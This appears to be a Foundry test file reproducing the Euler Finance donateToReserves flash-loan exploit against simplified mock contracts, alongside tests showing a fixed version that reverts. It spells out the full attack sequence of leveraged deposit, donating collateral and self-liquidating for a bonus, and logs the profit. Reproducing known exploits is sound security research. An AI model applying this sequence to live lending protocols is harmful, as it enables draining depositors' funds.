// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/Exploit.sol";

/// @title Euler Finance PoC — donateToReserves Flash Loan Exploit
/// @notice Full exploit flow: flash loan → deposit → mint → donate → self-liquidate → profit
contract EulerFinanceExploitTest is Test {
    MockToken public dai;
    SimplifiedEuler public euler;
    FlashLoanProvider public flashLender;

    address public attacker = makeAddr("attacker");
    address public attackerLiquidator = makeAddr("attackerLiquidator"); // Second account

    uint256 constant FLASH_LOAN_AMOUNT = 30_000_000e18; // 30M DAI
    uint256 constant EULER_LIQUIDITY = 200_000_000e18;  // 200M DAI in protocol

    function setUp() public {
        dai = new MockToken("DAI");
        euler = new SimplifiedEuler(address(dai));
        flashLender = new FlashLoanProvider(address(dai));

        // Fund flash loan provider
        dai.mint(address(flashLender), FLASH_LOAN_AMOUNT);

        // Fund Euler with existing liquidity (other depositors)
        dai.mint(address(euler), EULER_LIQUIDITY);
    }

    function test_normalDonate_isHarmless() public {
        // Normal scenario: user deposits and donates small amount
        dai.mint(attacker, 1000e18);

        vm.startPrank(attacker);
        dai.approve(address(euler), type(uint256).max);
        euler.deposit(1000e18);
        // Donating without debt is fine
        euler.donateToReservesBuggy(100e18);
        vm.stopPrank();

        assertEq(euler.eTokenBalance(attacker), 900e18);
        assertEq(euler.reserveBalance(), 100e18);
    }

    function test_exploit_donateToReservesFlashLoan() public {
        // ===== FULL EXPLOIT FLOW =====

        // Step 1: Attacker gets flash loan
        dai.mint(address(flashLender), FLASH_LOAN_AMOUNT); // Extra liquidity

        // Prepare attacker
        vm.startPrank(attacker);

        // Step 2: Deposit flash-loaned DAI as collateral
        // (Simulating — in reality this would be inside flash loan callback)
        dai.mint(attacker, FLASH_LOAN_AMOUNT); // Simulate receiving flash loan
        dai.approve(address(euler), type(uint256).max);
        euler.deposit(FLASH_LOAN_AMOUNT); // 30M eDAI

        // Step 3: Borrow against collateral
        uint256 borrowAmount = 20_000_000e18; // 20M DAI
        euler.mint(borrowAmount);

        // Step 4: Re-deposit borrowed DAI
        euler.deposit(borrowAmount); // Now has 50M eDAI, 20M dDAI

        assertEq(euler.eTokenBalance(attacker), 50_000_000e18, "Should have 50M eDAI");
        assertEq(euler.dTokenBalance(attacker), 20_000_000e18, "Should have 20M dDAI debt");

        // Step 5: EXPLOIT — Donate ALL eTokens to reserves (no health check!)
        euler.donateToReservesBuggy(50_000_000e18);

        // Attacker now has: 0 eDAI collateral, 20M dDAI debt → UNHEALTHY!
        assertEq(euler.eTokenBalance(attacker), 0, "Zero collateral after donate");
        assertEq(euler.dTokenBalance(attacker), 20_000_000e18, "Debt unchanged");
        assertFalse(euler.isHealthy(attacker), "Position should be unhealthy");

        vm.stopPrank();

        // Step 6: Self-liquidation from second account
        dai.mint(attackerLiquidator, 20_000_000e18);
        vm.startPrank(attackerLiquidator);
        dai.approve(address(euler), type(uint256).max);

        // Liquidate the unhealthy position — receive collateral + 5% bonus from reserves
        euler.liquidate(attacker, 20_000_000e18);
        vm.stopPrank();

        // Liquidator paid 20M DAI, received 21M DAI (20M + 5% bonus)
        uint256 liquidatorBalance = dai.balanceOf(attackerLiquidator);
        assertEq(liquidatorBalance, 21_000_000e18, "Liquidator gets 5% bonus");

        emit log("=== Exploit Result ===");
        emit log_named_decimal_uint("Liquidator paid", 20_000_000e18, 18);
        emit log_named_decimal_uint("Liquidator received", liquidatorBalance, 18);
        emit log_named_decimal_uint("Net profit (from reserves)", liquidatorBalance - 20_000_000e18, 18);
    }

    function test_fixed_donateRevertsWhenUnhealthy() public {
        dai.mint(attacker, FLASH_LOAN_AMOUNT);

        vm.startPrank(attacker);
        dai.approve(address(euler), type(uint256).max);
        euler.deposit(FLASH_LOAN_AMOUNT);

        uint256 borrowAmount = 20_000_000e18;
        euler.mint(borrowAmount);
        euler.deposit(borrowAmount);

        // FIXED version: donate should revert because it would make position unhealthy
        vm.expectRevert("unhealthy after donate");
        euler.donateToReservesFixed(50_000_000e18);

        vm.stopPrank();

        // Position remains healthy
        assertTrue(euler.isHealthy(attacker), "Position should still be healthy");
    }

    function test_fixed_smallDonateAllowed() public {
        dai.mint(attacker, 1000e18);

        vm.startPrank(attacker);
        dai.approve(address(euler), type(uint256).max);
        euler.deposit(1000e18);

        // Small donate without debt — should work fine with fixed version too
        euler.donateToReservesFixed(100e18);
        vm.stopPrank();

        assertEq(euler.eTokenBalance(attacker), 900e18);
    }
}
